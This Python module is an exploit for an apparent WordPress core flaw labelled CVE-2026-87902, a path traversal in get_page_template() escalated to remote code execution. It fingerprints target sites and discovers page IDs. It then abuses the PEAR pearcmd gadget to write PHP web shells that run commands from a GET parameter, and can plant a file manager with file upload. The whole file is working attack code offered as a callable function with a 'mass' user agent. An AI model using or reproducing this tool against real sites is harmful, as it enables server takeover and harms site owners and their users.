# -*- coding: utf-8 -*-
# CVE-2026-87902 — WordPress Core get_page_template() LFI -> RCE
# Affected: WP 4.7.0 - 7.1.1 | GHSA-7hp8-65ch-5whp | CVSS 9.8
# Function-only refactor (GUI stripped). No import side-effects.
# Usage:
#     from function.cve_2026_87902 import exploit
#     r = exploit('http://target.com', command='id', deploy_shell=True)
# Coded by MRdark-ops — refactored
import gzip
import re
import secrets
import socket
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib
from http.client import HTTPException

CVE_ID = 'CVE-2026-87902'
CVE_NAME = 'WP Core 4.7.0-7.1.1 get_page_template() LFI -> RCE'
DEFAULT_KWARGS = {'deploy_shell': False, 'max_time': 45.0}

# ────────────── constants ──────────────
DEPTH_TO_ROOT = 4
FIXED = {
    (4, 7): 37, (4, 8): 32, (4, 9): 33, (5, 0): 29, (5, 1): 26, (5, 2): 28,
    (5, 3): 25, (5, 4): 23, (5, 5): 22, (5, 6): 21, (5, 7): 19, (5, 8): 17,
    (5, 9): 18, (6, 0): 16, (6, 1): 14, (6, 2): 13, (6, 3): 12, (6, 4): 12,
    (6, 5): 12, (6, 6): 9, (6, 7): 9, (6, 8): 10, (6, 9): 9, (7, 0): 6, (7, 1): 2,
}

GENERATOR    = re.compile(r"<meta[^>]+name=['\"]generator['\"][^>]+content=['\"]WordPress ([^'\"]+)['\"]", re.I)
CORE_VERSION = re.compile(r"/wp-includes/[^\"']+\?ver=(\d+\.\d+(?:\.\d+)?)")
THEME_HREF   = re.compile(r"/wp-content/themes/([A-Za-z0-9][A-Za-z0-9_.-]*)/")
STYLESHEET   = re.compile(r"/wp-content/themes/([A-Za-z0-9][A-Za-z0-9_.-]*)/style\.css")
WP_HINT      = re.compile(r"/wp-content/|/wp-includes/|wp-json|<meta[^>]+WordPress|rest_route=", re.I)
OPML_PRIMARY = re.compile(r'<opml\s+version=', re.I)
OPML_STRUCT  = (re.compile(r'</opml>', re.I), re.compile(r'<outline\b', re.I), re.compile(r'<dateCreated>', re.I))
CORE_ELSEWHERE = (
    ("/?feed=rss2", re.compile(r"wordpress\.org/\?v=(\d+\.\d+(?:\.\d+)?)", re.I)),
    ("/wp-links-opml.php", re.compile(r'generator="WordPress/(\d+\.\d+(?:\.\d+)?)"', re.I)),
)
PAGE_ID_BODY = re.compile(r"\bpage-id-(\d+)\b")
SHORTLINK    = re.compile(r"rel=['\"]shortlink['\"][^>]*href=['\"][^'\"]*[?&]p=(\d+)", re.I)
CANONICAL_ID = re.compile(r"rel=['\"]canonical['\"][^>]*href=['\"][^'\"]*[?&]page_id=(\d+)", re.I)
ANY_PAGE_ID  = re.compile(r"[?&]page_id=(\d+)")
BODY_CLASS   = re.compile(r"<body[^>]*\bclass=['\"]([^'\"]*)", re.I)
REST_IDS     = re.compile(r'"id"\s*:\s*([0-9]+)')
REST_ROUTES = (
    "/?rest_route=/wp/v2/pages&per_page=100&_fields=id,slug,link,template",
    "/index.php?rest_route=/wp/v2/pages&per_page=100&_fields=id,slug,link,template",
    "/wp-json/wp/v2/pages?per_page=100&_fields=id,slug,link,template",
)
SITEMAPS = ("/wp-sitemap.xml", "/wp-sitemap-posts-page-1.xml",
            "/?sitemap=posts&sitemap-subtype=page", "/page-sitemap.xml",
            "/sitemap_index.xml", "/sitemap.xml")
GADGETS_PEAR = [
    "/usr/local/lib/php/pearcmd", "/usr/share/php/pearcmd", "/usr/share/php/pear/pearcmd",
    "/usr/lib/php/pearcmd", "/usr/local/share/pear/pearcmd", "/usr/share/pear/pearcmd",
    "/opt/local/lib/php/pearcmd", "/usr/local/lib/php/PEAR/Command",
    "C:/xampp/php/PEAR/pearcmd", "C:/php/php/PEAR/pearcmd", "/xampp/php/PEAR/pearcmd",
    "/usr/lib/php/20190902/pearcmd",
]
DEFAULT_SEGMENTS = ["templates", "templates/page-templates", "page-templates"]
DEFAULT_DEPTHS   = [4, 3, 5, 6, 7]
DEFAULT_ORACLE   = "wp-links-opml"
DEFAULT_PIDS     = [2, 3, 4, 5, 7, 10]
USER_AGENT       = "Mozilla/5.0 (compatible; CVE-2026-87902-mass/3.0)"
MARCA, MARCA_FIN = "___WP_RCE_OK___", "___WP_RCE_END___"
RUTAS_SALIDA     = ["/tmp/wp-cve-87902", "/tmp/wp87902", "/tmp/pear-rce"]

FILE_MANAGER = r'''<?php
error_reporting(0);
$d=__DIR__;
echo "<h1>File Manager</h1><p>Dir: ".htmlspecialchars(realpath($d))."</p>";
if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_FILES['file'])){
    if(move_uploaded_file($_FILES['file']['tmp_name'],$d.'/'.basename($_FILES['file']['name'])))
        echo "OK: ".htmlspecialchars(basename($_FILES['file']['name']));
    else echo "FAIL";
}
$out='';
foreach(scandir($d) as $f){ if($f!='.'&&$f!='..'){ $p="$d/$f";
    $sz=is_file($p)?filesize($p):0; $out.="<tr><td>".htmlspecialchars($f)."</td><td>$sz B</td></tr>"; } }
echo "<form method=POST enctype=multipart/form-data><input type=file name=file><button>Upload</button></form>";
echo "<table border=1>$out</table>";
?>
'''


# ────────────── helpers ──────────────
def _double(raw):
    return raw.replace(".", "%252e").replace("/", "%252f")


def _build_pagename(segment, depth, target):
    return _double(segment) + "%252f" + ("%252e%252e%252f" * depth) + _double(target)


def _build_payload(root, include, depth):
    target = include[:-4] if include.endswith('.php') else include
    climb = ('../' * depth + target.lstrip('/')) if target.startswith('/') else ('../' * DEPTH_TO_ROOT + target)
    return root + '/' + climb


def _parse_version(v):
    p = v.split('.')
    try:
        maj, mnr = int(p[0]), int(p[1])
    except (IndexError, ValueError):
        return None
    patch = None
    if len(p) >= 3:
        try:
            patch = int(p[2])
        except ValueError:
            patch = None
    return (maj, mnr, patch)


def _version_verdict(v):
    pv = _parse_version(v)
    if not pv:
        return ('unknown_patch', 'unparseable')
    maj, mnr, patch = pv
    if (maj, mnr, patch or 0) < (4, 7, 0):
        return ('out_of_range', f'{v} predates vulnerable code')
    if (maj, mnr) in FIXED:
        fix = FIXED[(maj, mnr)]
        if patch is None:
            return ('unknown_patch', f'branch {maj}.{mnr} fixed at .{fix}')
        if patch < fix:
            return ('vulnerable_range', f'{v} < {maj}.{mnr}.{fix}')
        return ('patched', f'{v} >= {maj}.{mnr}.{fix}')
    if (maj, mnr) > (7, 1):
        return ('out_of_range', f'{v} released after fix')
    if (4, 7) <= (maj, mnr) <= (7, 1):
        return ('vulnerable_range', f'{v} in affected range')
    return ('out_of_range', f'{v} outside range')


def _normalize(url):
    url = (url or '').strip()
    if not url or url.startswith('#'):
        return None
    if not re.match(r'^https?://', url, re.I):
        url = 'http://' + url
    return url.rstrip('/')


def _canonical_base(input_base, final_url):
    o, f = urllib.parse.urlsplit(input_base), urllib.parse.urlsplit(final_url or '')
    scheme = f.scheme or o.scheme or 'http'
    netloc = f.netloc or o.netloc
    fpath, opath = f.path or '', o.path or ''
    path = fpath if fpath not in ('', '/') else opath
    return ('%s://%s%s' % (scheme, netloc, path)).rstrip('/')


# ────────────── HTTP ──────────────
class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k): return None


def _decompress(raw, hdrs):
    enc = (hdrs.get('content-encoding') or '').lower()
    try:
        if 'gzip' in enc: return gzip.decompress(raw)
        if 'deflate' in enc:
            try: return zlib.decompress(raw)
            except zlib.error: return zlib.decompress(raw, -zlib.MAX_WBITS)
    except Exception:
        return raw
    return raw


class HTTPClient:
    def __init__(self, verify_ssl=False, proxy=None):
        ctx = ssl.create_default_context()
        if not verify_ssl:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        https = urllib.request.HTTPSHandler(context=ctx)
        hf, hn = [https], [https, _NoRedirect()]
        if proxy:
            p = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
            hf.append(p); hn.append(p)
        self.opener = urllib.request.build_opener(*hf)
        self.noredir = urllib.request.build_opener(*hn)

    def _request(self, opener, method, url, headers, timeout, data=None, max_bytes=524288):
        try:
            req = urllib.request.Request(url=url, data=data, method=method)
        except ValueError as e:
            return -1, url, {}, f'transport-error: {e}'
        for k, v in headers.items():
            req.add_header(k, v)
        try:
            r = opener.open(req, timeout=timeout)
            raw = _decompress(r.read(max_bytes), {k.lower(): v for k, v in r.headers.items()})
            try:
                charset = r.headers.get_content_charset() or 'utf-8'
            except Exception:
                charset = 'utf-8'
            try:
                body = raw.decode(charset, 'replace')
            except (LookupError, TypeError):
                body = raw.decode('utf-8', 'replace')
            return r.getcode(), r.geturl(), dict(r.headers), body
        except urllib.error.HTTPError as e:
            raw = b''
            try: raw = e.read(max_bytes)
            except Exception: pass
            hdrs = {}
            try: hdrs = {k.lower(): v for k, v in e.headers.items()}
            except Exception: pass
            return e.code, url, hdrs, _decompress(raw, hdrs).decode('utf-8', 'replace')
        except (urllib.error.URLError, socket.timeout, ssl.SSLError,
                ConnectionError, HTTPException, LookupError, OSError) as e:
            return -1, url, {}, f'transport-error: {getattr(e, "reason", e)}'

    def get(self, url, headers, timeout, follow=True):
        return self._request(self.opener if follow else self.noredir, 'GET', url, headers, timeout)

    def post(self, url, headers, timeout, data=None, follow=True):
        return self._request(self.opener if follow else self.noredir, 'POST', url, headers, timeout, data=data)


# ────────────── fingerprint ──────────────
def _fingerprint(http, headers, timeout, base, home_body=None):
    body = home_body or http.get(base + '/', headers, timeout)[3] or ''
    is_wp = bool(WP_HINT.search(body))
    version = None
    for rx in (GENERATOR, CORE_VERSION):
        m = rx.search(body)
        if m:
            version = m.group(1); break
    if not version:
        for path, rx in CORE_ELSEWHERE:
            st, _, _, b = http.get(base + path, headers, timeout)
            if st == 200:
                m = rx.search(b or '')
                if m:
                    version = m.group(1); is_wp = True; break
    theme = None
    m = STYLESHEET.search(body) or THEME_HREF.search(body)
    if m:
        theme = m.group(1)
    verdict, note = _version_verdict(version) if version else ('unknown', 'version not determined')
    return {
        'is_wordpress': is_wp or bool(version),
        'wordpress': version,
        'theme': theme,
        'version_verdict': verdict,
        'version_note': note,
        'body': body,
    }


def _check_theme_dir(http, headers, timeout, base, theme):
    if not theme:
        return None
    for cand in DEFAULT_SEGMENTS:
        for path in (f'/wp-content/themes/{theme}/{cand}/', f'/wp-content/themes/{theme}/{cand}'):
            st, _, _, b = http.get(base + path, headers, timeout)
            if st == 200 and 'index of' not in (b or '').lower():
                return cand
    return None


# ────────────── page discovery ──────────────
def _discover_pages(http, headers, timeout, base, home='', probe=12):
    found, seen = [], set()
    def add(i):
        try: i = int(i)
        except (TypeError, ValueError): return
        if i > 0 and i not in seen:
            seen.add(i); found.append(i)
    for route in REST_ROUTES:
        st, _, _, b = http.get(base + route, headers, timeout)
        if st == 200 and b:
            for i in REST_IDS.findall(b): add(i)
    for sm in SITEMAPS:
        st, _, _, b = http.get(base + sm, headers, timeout)
        if st == 200 and b:
            for loc in re.findall(r'<loc>\s*([^<\s]+)\s*</loc>', b, re.I):
                for i in ANY_PAGE_ID.findall(loc): add(i)
    for rx in (PAGE_ID_BODY, ANY_PAGE_ID, SHORTLINK, CANONICAL_ID):
        for i in rx.findall(home or ''): add(i)
    m = BODY_CLASS.search(home or '')
    if m:
        for i in PAGE_ID_BODY.findall(m.group(1)): add(i)
    if not found:
        for i in DEFAULT_PIDS: add(i)
    return found[:probe]


# ────────────── traversal oracle ──────────────
def _opml_hit(status, body):
    if not (status == 200 and OPML_PRIMARY.search(body or '')):
        return False, []
    marks = ['<opml version=']
    for rx in OPML_STRUCT:
        if rx.search(body): marks.append(rx.pattern)
    return (len(marks) >= 2), marks


def _traversal_exploit(http, headers, timeout, base, page_ids, segments, depths,
                       oracle_file=DEFAULT_ORACLE, max_time=60.0):
    t0 = time.monotonic()
    def left(): return max_time - (time.monotonic() - t0)
    def probe(pid, method, seg, depth, tgt):
        url = base + f'/?page_id={pid}&pagename={_build_pagename(seg, depth, tgt)}'
        if method == 'POST':
            r = http.post(url, headers, timeout, data=b'', follow=False)
        else:
            r = http.get(url, headers, timeout, follow=False)
        return r[0], r[3], url

    extra = [oracle_file, 'wp/' + oracle_file, 'wordpress/' + oracle_file]
    plan = [(page_ids[:1], segments, [oracle_file]), (page_ids[:4], segments, extra)]
    tried, seen = 0, set()
    for pids, segs, targets in plan:
        for pid in pids:
            for method in ('POST', 'GET'):
                for seg in segs:
                    for depth in depths:
                        for tgt in targets:
                            key = (pid, method, seg, depth, tgt)
                            if key in seen or left() <= 0: continue
                            seen.add(key)
                            st, body, url = probe(pid, method, seg, depth, tgt)
                            tried += 1
                            hit, marks = _opml_hit(st, body)
                            if hit:
                                nx = tgt + f'-nx{int(time.time() * 1000) % 100000}'
                                st2, b2, _ = probe(pid, method, seg, depth, nx)
                                if _opml_hit(st2, b2)[0]:
                                    continue
                                return {
                                    'fired': True, 'method': method, 'page_id': pid,
                                    'segment': seg, 'depth': depth,
                                    'oracle_file': tgt, 'http_status': st,
                                    'markers': marks, 'request': url,
                                }
    return {'fired': False, 'requests_tried': tried, 'timed_out': left() <= 0}


# ────────────── RCE escalation ──────────────
def _rce_escalate(http, headers, timeout, base, page_id, root, depths,
                  command='id', drop='/tmp', deploy_shell=False, debug=False, log=None):
    extra_depths = list(range(1, 20))
    all_depths = list(dict.fromkeys(extra_depths + list(depths)))
    res = {'rce': False, 'shell_deployed': False, 'shell_url': '',
           'gadget': '', 'salida': '', 'ran': '', 'detail': ''}

    def _log(msg):
        if debug and log is not None:
            log.append(msg)

    _, _, _, bbody = http.post(base + '/', headers, timeout,
                               data=f'page_id={page_id}'.encode(), follow=False)
    baseline = len(bbody or '')

    def differs(cur, base_len):
        if base_len == 0 and cur > 200: return True
        if cur == 0 and base_len > 200: return True
        return abs(cur - base_len) > max(600, 0.30 * max(cur, base_len))

    # P1: gadget
    _log('[P1] probing PEAR gadget')
    gadget, prof = None, None
    for depth in all_depths:
        for pear in GADGETS_PEAR:
            pn = _double(_build_payload(root, pear, depth))
            _, _, _, b = http.post(base + '/', headers, timeout,
                                   data=f'page_id={page_id}&pagename={pn}'.encode(), follow=False)
            if differs(len(b or ''), baseline):
                gadget, prof = pear, depth
                _log(f'[P1] gadget {pear} @ depth={depth}')
                break
        if gadget: break
    if not gadget:
        res['detail'] = 'no PEAR gadget responded'
        return res
    res['gadget'] = gadget

    # P2: file manager
    if deploy_shell:
        _log('[P2] deploying file manager')
        fm_name = 'fm_' + secrets.token_hex(4) + '.php'
        fm_path = f'{drop.rstrip("/")}/{fm_name}'
        fm_code = '<?=' + FILE_MANAGER + '?>'
        args = f'config-create+/{fm_code}+{fm_path}'
        pn = _double(_build_payload(root, gadget, prof))
        _, _, _, b = http.post(base + '/?' + args, headers, timeout,
                               data=f'page_id={page_id}&pagename={pn}'.encode(), follow=False)
        if b and 'CONFIGURATION' in b:
            for td in range(1, 20):
                pn2 = _double(_build_payload(root, fm_path.lstrip('/'), td))
                _, _, _, b2 = http.post(base + '/', headers, timeout,
                                        data=f'page_id={page_id}&pagename={pn2}'.encode(), follow=False)
                if b2 and ('File Manager' in b2 or 'fm_' in b2):
                    res['shell_deployed'] = True
                    res['shell_url'] = f'{base}/?page_id={page_id}&pagename={pn2}'
                    res['salida'] = fm_path
                    res['detail'] = f'file manager at {fm_path}'
                    _log(f'[P2] {res["shell_url"]}')
                    return res
        _log('[P2] file manager deploy failed')

    # P3: write PHP + exec
    _log('[P3] writing PHP via config-create')
    payloads = [
        ('system', '<?=system($_GET[0])?>'),
        ('passthru', '<?=passthru($_GET[0])?>'),
        ('shell_exec', '<?=shell_exec($_GET[0])?>'),
        ('backtick', '<?=`$_GET[0]`?>'),
    ]
    written, used_out = False, ''
    for name, code in payloads:
        for out in RUTAS_SALIDA:
            args = f'config-create+/{code}+{out}.php'
            pn = _double(_build_payload(root, gadget, prof))
            _, _, _, b = http.post(base + '/?' + args, headers, timeout,
                                   data=f'page_id={page_id}&pagename={pn}'.encode(), follow=False)
            if b and 'CONFIGURATION' in b:
                written, used_out = True, out
                break
        if written: break
    if not written:
        res['detail'] = 'config-create failed'
        return res
    res['salida'] = used_out
    _log(f'[P3] written {used_out}.php')

    for depth in all_depths:
        pn = _double(_build_payload(root, f'{used_out}.php', depth))
        url = base + '/?' + urllib.parse.urlencode({'0': f'echo {MARCA}; {command}; echo {MARCA_FIN}'})
        _, _, _, b = http.post(url, headers, timeout,
                               data=f'page_id={page_id}&pagename={pn}'.encode(), follow=False)
        if b and MARCA in b:
            s = b.find(MARCA) + len(MARCA)
            e = b.find(MARCA_FIN, s)
            out = b[s:e].strip() if e > s else b[s:s + 500].strip()
            res['rce'] = True
            res['ran'] = out
            res['detail'] = f'{command}: {out[:80]}'
            return res
    res['detail'] = 'shell written but exec failed'
    return res


# ────────────── public helper ──────────────
def run(shell_url, cmd, timeout=15):
    """Execute command via file manager shell URL. Return response text."""
    try:
        sep = '&' if '?' in shell_url else '?'
        url = shell_url + sep + urllib.parse.urlencode({'0': cmd})
        req = urllib.request.Request(url, headers={'User-Agent': USER_AGENT})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode('utf-8', 'replace').strip()
    except Exception as e:
        return f'<cmd error: {e}>'


# ────────────── PUBLIC FUNCTION ──────────────
def exploit(target_url, command='id', deploy_shell=False, drop='/tmp',
            max_time=45.0, probe=12, timeout=12.0, proxy=None,
            verify_ssl=False, segments=None, depths=None, oracle=DEFAULT_ORACLE,
            debug=False):
    """
    Exploit CVE-2026-87902 (WP Core 4.7.0-7.1.1 LFI -> RCE).

    Args:
        target_url   : str  — 'http://x.com', 'x.com'
        command      : str  — command setelah RCE (default: id)
        deploy_shell : bool — deploy File Manager PHP
        drop         : str  — direktori write (default: /tmp)
        max_time     : float — max traversal oracle time
        probe        : int  — jumlah page_id untuk dicoba
        timeout      : float — per-request timeout
        proxy        : str  — HTTP proxy
        verify_ssl   : bool — True = strict SSL
        segments     : list — theme dir candidates
        depths       : list — traversal depth candidates
        oracle       : str  — file oracle (default: wp-links-opml)
        debug        : bool — collect log

    Returns:
        dict — standard contract
    """
    res = {
        'target': target_url,
        'cve': CVE_ID,
        'plugin': 'core (get_page_template)',
        'endpoint': None,
        'http_status': None,
        'vulnerable': False,
        'rce_verified': 'NO',
        'output': '',
        'shell_url': '',
        'marker': MARCA,
        'detail': '',
        'exploited': False,
        'log': [],
        'version': None,
        'theme': None,
        'evidence': None,
    }
    log = res['log']

    def _step(msg):
        if debug:
            log.append(msg)

    if not target_url or not target_url.strip():
        res['detail'] = 'empty target'
        return res
    base = _normalize(target_url)
    if not base:
        res['detail'] = 'invalid target'
        return res

    segments = segments or DEFAULT_SEGMENTS
    depths = depths or DEFAULT_DEPTHS
    http = HTTPClient(verify_ssl=verify_ssl, proxy=proxy)
    headers = {
        'User-Agent': USER_AGENT, 'Accept': '*/*',
        'Accept-Encoding': 'identity', 'Connection': 'close',
    }

    try:
        st, final, _, body = http.get(base + '/', headers, timeout)
        if st < 0:
            res['detail'] = body
            return res
        base = _canonical_base(base, final)
        res['target'] = base
        _step(f'probe {base}')

        fp = _fingerprint(http, headers, timeout, base, home_body=body)
        res['version'] = fp['wordpress'] or '?'
        res['theme'] = fp['theme']
        _step(f"WP={res['version']} theme={fp['theme']} verdict={fp['version_verdict']}")

        if not fp['is_wordpress'] and not fp['wordpress']:
            res['detail'] = 'no WordPress indicators'
            return res
        if fp['version_verdict'] in ('patched', 'out_of_range'):
            res['detail'] = fp['version_note']
            return res

        directory = None
        if fp['theme']:
            directory = _check_theme_dir(http, headers, timeout, base, fp['theme'])
        segments = list(dict.fromkeys(([directory] if directory else []) + list(segments)))
        _step(f'segments={segments}')

        pages = _discover_pages(http, headers, timeout, base, home=body, probe=probe)
        if not pages:
            res['detail'] = 'no page_id discovered'
            return res
        _step(f'page_ids={pages[:4]}')

        oracle_result = _traversal_exploit(http, headers, timeout, base,
                                           pages[:4], segments, depths,
                                           oracle_file=oracle, max_time=max_time)
        if not oracle_result.get('fired'):
            res['detail'] = f'LFI oracle not triggered ({oracle_result.get("requests_tried", 0)} req)'
            return res

        res['vulnerable'] = True
        res['endpoint'] = oracle_result['request']
        res['http_status'] = oracle_result['http_status']
        _step(f"LFI: page_id={oracle_result['page_id']} seg={oracle_result['segment']} depth={oracle_result['depth']}")

        # escalate to RCE
        rce = _rce_escalate(http, headers, timeout, base,
                            oracle_result['page_id'], oracle_result['segment'],
                            depths, command=command, drop=drop,
                            deploy_shell=deploy_shell, debug=debug, log=log)

        if rce['shell_deployed']:
            res['shell_url'] = rce['shell_url']
            res['exploited'] = True
            res['rce_verified'] = 'YES'
            res['output'] = f'file manager at {rce["salida"]}'
            res['detail'] = rce['detail']
            res['evidence'] = {
                'type': 'shell',
                'shell_url': rce['shell_url'],
                'write_path': rce['salida'],
                'gadget': rce['gadget'],
            }
        elif rce['rce']:
            res['exploited'] = True
            res['rce_verified'] = 'YES'
            res['output'] = rce['ran'][:300]
            res['detail'] = rce['detail']
            res['evidence'] = {
                'type': 'rce',
                'output': rce['ran'],
                'gadget': rce['gadget'],
                'write_path': rce['salida'],
            }
        else:
            res['detail'] = rce['detail'] or 'LFI confirmed but RCE failed'
        return res
    except Exception as e:
        res['detail'] = f'unhandled: {type(e).__name__}: {e}'
        return res